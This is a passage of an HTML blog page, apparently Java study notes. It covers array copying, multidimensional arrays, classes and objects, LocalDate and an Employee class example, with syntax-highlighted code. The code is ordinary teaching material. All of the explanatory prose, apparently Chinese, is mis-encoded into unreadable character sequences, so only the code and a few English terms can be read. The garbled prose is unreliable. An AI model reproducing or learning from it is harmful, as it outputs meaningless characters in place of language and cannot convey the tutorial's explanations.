punctuation">;</span></code></pre><p>Êï∞ÁªÑÊã∑Ë¥ùÔºö</p><p>Â∞Ü‰∏Ä‰∏™Êï∞ÁªÑÂèòÈáèÊã∑Ë¥ùÂà∞Âè¶‰∏Ä‰∏™Êï∞ÁªÑÂèòÈáèÔºåËøôÊó∂‰∏§‰∏™ÂèòÈáèÂ∞ÜÂºïÁî®Âêå‰∏ÄÊï∞ÁªÑÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span></code></pre><p>Â¶ÇÊûúÂ∏åÊúõÂ∞Ü‰∏ÄÊï∞ÁªÑ‰∏≠ÁöÑÊâÄÊúâÂÄºÊã∑Ë¥ùÂà∞‰∏Ä‰∏™Êñ∞ÁöÑÊï∞ÁªÑ‰∏≠ÂéªÔºåÂ∏∏Áî®ArraysÁ±ªÁöÑcopyOfÊñπÊ≥ïÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span></code></pre><p>copyOfÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÊñ∞Êï∞ÁªÑÁöÑÂ§ßÂ∞èÔºåÊ≠£Â∏∏ÂèØ‰ª•ÊØîÂéüÊï∞ÁªÑÁöÑÈïøÂ∫¶Ë¶ÅÂ§ßÔºå‰ª•Â¢ûÈïøÊï∞ÁªÑ„ÄÇÂ¶ÇÊûúÁü≠ÁöÑËØùÔºåÂ∞±Âè™‰ºöÊã∑Ë¥ùÂâçÈù¢ÁöÑÂÄº„ÄÇ</p><p><code>Arrays.sort()</code>Ôºå‰ΩøÁî®‰ºòÂåñÁöÑÂø´ÈÄüÊéíÂ∫èÁÆóÊ≥ï„ÄÇ</p><p><strong>Â§öÁª¥Êï∞ÁªÑ</strong></p><p>Â£∞ÊòéÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> feng<span class="token punctuation">;</span></code></pre><p>ÂàùÂßãÂåñÔºö</p><pre class="language-java" data-language="java"><code class="language-java">feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>for each‰∏çËÉΩËá™Âä®Â§ÑÁêÜ‰∫åÁª¥Êï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂÖÉÁ¥†ÔºåÂÆÉÊòØÂæ™ÁéØË°åÁöÑÔºåÂõ†Ê≠§Ë¶Å‰ΩøÁî®2Â±Çfor each„ÄÇ</p><p>Âø´ÈÄüÊâìÂç∞‰∏Ä‰∏™‰∫åÁª¥Êï∞ÁªÑÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepToString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Á±ª‰∏éÂØπË±°"><a href="#Á±ª‰∏éÂØπË±°" class="headerlink" title="Á±ª‰∏éÂØπË±°"></a>Á±ª‰∏éÂØπË±°</h3><p><strong>Èù¢ÂêëÂØπË±°Á®ãÂ∫èËÆæËÆ°Ôºàobject-oriented programming,OOPÔºâ</strong></p><p>Áî±Á±ªÊûÑÈÄ†(construct)ÂØπË±°ÁöÑËøáÁ®ãÁß∞‰∏∫ÂàõÂª∫Á±ªÁöÑÂÆû‰æã„ÄÇ</p><p>ÂØπË±°‰∏≠ÁöÑÊï∞ÊçÆÁß∞‰∏∫ÂÆû‰æãÂ≠óÊÆµÔºåÊìç‰ΩúÊï∞ÊçÆÁöÑËøáÁ®ãÁß∞‰∏∫ÊñπÊ≥ï„ÄÇ</p><p>ÂÆûÁé∞Â∞ÅË£ÖÁöÑÂÖ≥ÈîÆÂú®‰∫éÔºåÁªùÂØπ‰∏çËÉΩËÆ©Á±ª‰∏≠ÁöÑÊñπÊ≥ïÁõ¥Êé•ËÆøÈóÆÂÖ∂‰ªñÁ±ªÁöÑÂÆû‰æãÂ≠óÊÆµ„ÄÇÁ®ãÂ∫èÂè™ËÉΩÈÄöËøáÂØπË±°ÁöÑÊñπÊ≥ï‰∏éÂØπË±°ËøõË°å‰∫§‰∫í„ÄÇ</p><p>Java‰∏≠ÔºåÊâÄÊúâÂÖ∂‰ªñÁ±ªÈÉΩÊãìÂ±ïËá™ObjectÁ±ª„ÄÇ</p><p>Á±ª‰πãÈó¥ÔºåÊúÄÂ∏∏ËßÅÁöÑÂÖ≥Á≥ªÔºö</p><ul><li>‰æùËµñÔºàuses-aÔºâ</li><li>ËÅöÂêàÔºàhas-aÔºâ</li><li>ÁªßÊâøÔºàis-aÔºâ</li></ul><p>Â¶ÇÊûú‰∏Ä‰∏™Á±ªÁöÑÊñπÊ≥ï‰ΩøÁî®ÊàñÊìçÁ∫µÂè¶‰∏Ä‰∏™Á±ªÁöÑÂØπË±°ÔºåÊàë‰ª¨Â∞±ËØ¥‰∏Ä‰∏™Á±ª‰æùËµñ‰∫éÂè¶‰∏Ä‰∏™Á±ª„ÄÇ</p><p>Java‰∏≠‰ΩøÁî®ÊûÑÈÄ†Âô®ÊûÑÈÄ†Êñ∞ÂÆû‰æã„ÄÇÊûÑÈÄ†Âô®ÁöÑÂêçÂ≠óÂ∫îËØ•‰∏éÁ±ªÂêçÁõ∏Âêå„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Date</span> nowTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nowTime<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÂØπË±°ÂèòÈáèÂπ∂Ê≤°ÊúâÂÆûÈôÖÂåÖÂê´‰∏Ä‰∏™ÂØπË±°ÔºåÂÆÉÂè™ÊòØÂºïÁî®‰∏Ä‰∏™ÂØπË±°„ÄÇ</p><p>Âú®Java‰∏≠Ôºå‰ªª‰ΩïÂØπË±°ÂèòÈáèÁöÑÂÄºÈÉΩÊòØÂØπÂ≠òÂÇ®Âú®Âè¶‰∏Ä‰∏™Âú∞ÊñπÁöÑÊüê‰∏™ÂØπË±°ÁöÑÂºïÁî®„ÄÇnewÊìç‰ΩúÁ¨¶ÁöÑËøîÂõûÂÄº‰πüÊòØ‰∏Ä‰∏™ÂºïÁî®„ÄÇ</p><p>Âú®Java‰∏≠ÔºåÂøÖÈ°ª‰ΩøÁî®cloneÊñπÊ≥ïËé∑ÂæóÂØπË±°ÁöÑÂÆåÊï¥ÂâØÊú¨„ÄÇ</p><p>Ê†áÂáÜJavaÁ±ªÂ∫ìÂàÜÂà´ÂåÖÂê´‰∫Ü‰∏§‰∏™Á±ªÔºö‰∏Ä‰∏™ÊòØÁî®Êù•Ë°®Á§∫Êó∂Èó¥ÁÇπÁöÑDateÁ±ªÔºåÂè¶‰∏Ä‰∏™ÊòØÂ§ßÂÆ∂ÁÜüÊÇâÁöÑÊó•ÂéÜË°®Á§∫Ê≥ïË°®Á§∫Êó•ÊúüÁöÑLocalDateÁ±ª„ÄÇ</p><p>‰∏çË¶Å‰ΩøÁî®ÊûÑÈÄ†Âô®Êù•ÊûÑÈÄ†LocalDateÁ±ªÁöÑÂØπË±°ÔºåÂ∫îÂΩì‰ΩøÁî®ÈùôÊÄÅÂ∑•ÂéÇÊñπÊ≥ï„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> date1 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> date2 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2001</span><span class="token punctuation">,</span><span class="token number">01</span><span class="token punctuation">,</span><span class="token number">02</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2024-09-01</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2001-01-02</span><span class="token keyword">int</span> year <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> month <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getMonthValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> day <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>day<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token class-name">LocalDate</span> date3 <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">plusDays</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001-01-03</span><span class="token class-name">LocalDate</span> date4 <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">minusDays</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001-01-01</span></code></pre><p><strong>Êõ¥ÊîπÂô®ÊñπÊ≥ïÔºö</strong>Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÂêéÔºåÂØπË±°ÁöÑÁä∂ÊÄÅ‰ºöÊîπÂèò„ÄÇ</p><p><strong>ËÆøÈóÆÂô®ÊñπÊ≥ïÔºö</strong>Âè™ËÆøÈóÆÂØπË±°ËÄå‰∏ç‰øÆÊîπÂØπË±°ÁöÑÊñπÊ≥ï„ÄÇ</p><p>Êñá‰ª∂ÂêçÂøÖÈ°ª‰∏épublicÁ±ªÁöÑÂêçÂ≠óÁõ∏ÂåπÈÖç„ÄÇÂú®‰∏Ä‰∏™Ê∫êÊñá‰ª∂‰∏≠ÔºåÂè™ËÉΩÊúâ‰∏Ä‰∏™ÂÖ¨ÂÖ±Á±ªÔºå‰ΩÜÂèØ‰ª•Êúâ‰ªªÊÑèÊï∞ÁõÆÁöÑÈùûÂÖ¨ÂÖ±Á±ª„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee_test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token punctuation">]</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Carl Cracker"</span><span class="token punctuation">,</span> <span class="token number">75000</span><span class="token punctuation">,</span> <span class="token number">1987</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Harry Hacker"</span><span class="token punctuation">,</span> <span class="token number">50000</span><span class="token punctuation">,</span> <span class="token number">1989</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Tony Tester"</span><span class="token punctuation">,</span> <span class="token number">40000</span><span class="token punctuation">,</span> <span class="token number">1990</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> e <span class="token operator">:</span> staff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">raiseSalary</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> e <span class="token operator">:</span> staff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",salary="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",hireDay="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getHireDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDate</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">double</span> salary<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">LocalDate</span> hireDay<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">,</span> <span class="token keyword">int</span> year<span class="token punctuation">,</span> <span class="token keyword">int</span> month<span class="token punctuation">,</span> <span class="token keyword">int</span> day<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hireDay <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">LocalDate</span> <span class="token function">getHireDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hireDay<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">raiseSalary</span><span class="token punctuation">(</span><span class="token keyword">double</span> byPercent<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">double</span> raise <span class="token operator">=</span> salary<span class="token operator">*</span>byPercent<span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">+=</span> raise<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>ÊûÑÈÄ†Âô®</strong></p><p>ÊûÑÈÄ†Âô®‰∏éÁ±ªÂêåÂêç„ÄÇÂú®ÊûÑÈÄ†EmployeeÁ±ªÁöÑÂØπË±°Êó∂ÔºåÊûÑÈÄ†Âô®‰ºöËøêË°åÔºå‰ªéËÄåÂ∞ÜÂÆû‰æãÂ≠óÊÆµÂàùÂßãÂåñ‰∏∫ÊâÄÂ∏åÊúõÁöÑÂàùÂßãÁä∂ÊÄÅ„ÄÇ</p><p>ÊûÑÈÄ†Âô®ÊÄªÊòØÁªìÂêànewËøêÁÆóÁ¨¶Êù•Ë∞ÉÁî®„ÄÇ‰∏çËÉΩÂØπ‰∏Ä‰∏™Â∑≤ÁªèÂ≠òÂú®ÁöÑÂØπË±°Ë∞ÉÁî®ÊûÑÈÄ†Âô®Êù•ËææÂà∞ÈáçÊñ∞ËÆæÁΩÆÂÆû‰æãÂ≠óÊÆµÁõÆÁöÑ„ÄÇ</p><p>‰∏çË¶ÅÂú®ÊûÑÈÄ†Âô®‰∏≠ÂÆö‰πâ‰∏éÂÆû‰æãÂ≠óÊÆµÂêåÂêçÁöÑÂ±ÄÈÉ®ÂèòÈáè„ÄÇ</p><p><strong>‰ªéJava10ÂºÄÂßãÔºåÂØπ‰∫éÂ±ÄÈÉ®ÂèòÈáèÔºåÂ¶ÇÊûúÂèØ‰ª•‰ªéÂèòÈáèÁöÑÂàùÂßãÂÄºÊé®Êñ≠Âá∫ÂÆÉÁöÑÁ±ªÂûãÔºåÂ∞±‰∏çÂÜçÈúÄË¶ÅÂ£∞ÊòéÁ±ªÂûãÔºåÂè™ÈúÄË¶Å‰ΩøÁî®ÂÖ≥ÈîÆÂ≠óvarËÄåÊó†ÈúÄÊåáÂÆöÁ±ªÂûã</strong></p><p>Ê≥®ÊÑèvarÂÖ≥ÈîÆÂ≠óÂè™ËÉΩÁî®‰∫éÊñπÊ≥ï‰∏≠ÁöÑÂ±ÄÈÉ®ÂèòÈáè„ÄÇÂèÇÊï∞ÂíåÂ≠óÊÆµÁöÑÁ±ªÂûãÂøÖÈ°ªÂ£∞Êòé„ÄÇ</p><p>Â¶ÇÊûúÂØπnullÂÄºÂ∫îÁî®‰∏Ä‰∏™ÊñπÊ≥ïÔºå‰ºö‰∫ßÁîü‰∏Ä‰∏™<code>NullPointerException</code>ÂºÇÂ∏∏„ÄÇ</p><p><strong>ÈöêÂºèÂèÇÊï∞ÂíåÊòæÂºèÂèÇÊï∞</strong></p><p><code>raiseSalary</code>ÊñπÊ≥ïÊúâ2‰∏™ÂèÇÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Áß∞‰∏∫ÈöêÂºèÂèÇÊï∞ÔºåÊòØÂá∫Áé∞Âú®ÊñπÊ≥ïÂêçÂâçÁöÑEmployeeÁ±ªÂûãÁöÑÂØπË±°„ÄÇÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØ‰Ωç‰∫éÊñπÊ≥ïÂêçÂêéÈù¢Êã¨Âè∑‰∏≠ÁöÑÊï∞ÂÄºÔºåËøô‰∫ã‰∏Ä‰∏™ÊòæÂºèÂèÇÊï∞„ÄÇ</p><p>Âú®ÊØè‰∏Ä‰∏™ÊñπÊ≥ï‰∏≠ÔºåÂÖ≥ÈîÆÂ≠ó<code>this</code>ÊåáÁ§∫ÈöêÂºèÂèÇÊï∞„ÄÇ</p><p><strong>Ê≥®ÊÑè‰∏çË¶ÅÁºñÂÜôËøîÂõûÂèØÂèòÂØπË±°ÂºïÁî®ÁöÑËÆøÈóÆÂô®ÊñπÊ≥ï</strong></p><p>Â¶ÇÊûúÈúÄË¶ÅËøîÂõû‰∏Ä‰∏™ÂèØÂèòÂØπË±°ÁöÑÂºïÁî®ÔºåÈ¶ñÂÖàÂ∫îËØ•ÂØπÂÆÉËøõË°åÂÖãÈöÜ„ÄÇÂØπË±°ÂÖãÈöÜÊòØÊåáÂ≠òÊîæÂú®Âè¶‰∏Ä‰∏™Êñ∞‰ΩçÁΩÆ‰∏äÁöÑÂØπË±°ÂâØÊú¨„ÄÇ</p><p><strong>‰∏Ä‰∏™ÊñπÊ≥ïÂèØ‰ª•ËÆøÈóÆÊâÄÂ±ûÁ±ªÁöÑÊâÄÊúâÂØπË±°ÁöÑÁßÅÊúâÊï∞ÊçÆ</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOtherName</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> other<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> other<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token class-name">Employee</span> other <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"fengfeng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">2001</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getOtherName</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 